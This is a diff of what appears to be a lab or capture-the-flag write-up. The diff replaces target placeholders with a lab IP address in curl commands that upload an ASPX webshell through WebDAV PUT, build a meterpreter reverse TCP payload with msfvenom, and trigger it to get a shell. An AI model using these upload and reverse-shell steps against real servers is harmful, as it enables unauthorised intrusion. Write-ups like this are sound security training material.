@@ -105,7 +105,7 @@ The results show what extensions succeeded and what failed. The aspx extension w
 Using 'curl' I attempted to upload a txt file to verify if I can really upload one based off the above results.
 
 ```bash
-curl -X PUT http://TARGET/test.txt -d @test.txt
+curl -X PUT http://10.129.95.234/test.txt -d @test.txt
 ```
 
 The upload was a success, next I attempted to upload a file with the .aspx extension. Just like as the results from the davtest pointed out, I was not successful with this attempt.
@@ -164,7 +164,7 @@ Response.Write("</pre>");
 ```
 CURL Command:
 ```bash
-curl -X PUT http://TARGET_IP/test.txt -d @cmdasp.aspx
+curl -X PUT http://10.129.95.234/test.txt -d @cmdasp.aspx
 ```
 The command above used the "PUT" method to upload the webshell disguised as a .txt file.
 
@@ -184,7 +184,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=4444 -f aspx > shel
 ```
 Using "CURL" I will upload the payload:
 ```bash
-curl -X PUT http://TARGET/shell.txt --data-binary @shell.aspx
+curl -X PUT http://10.129.95.234/shell.txt --data-binary @shell.aspx
 ```
 --data-binary is to ensure the preservation of newlines and other control characters.
 ```bash
@@ -197,7 +197,7 @@ exploit/multi/handler
 
 After setting my options and running the exploit, I triggered the payload.
 ```bash
-curl http://TARGET/shell.aspx
+curl http://10.129.95.234/shell.aspx
 ```
 
 After triggering the payload I got a shell.
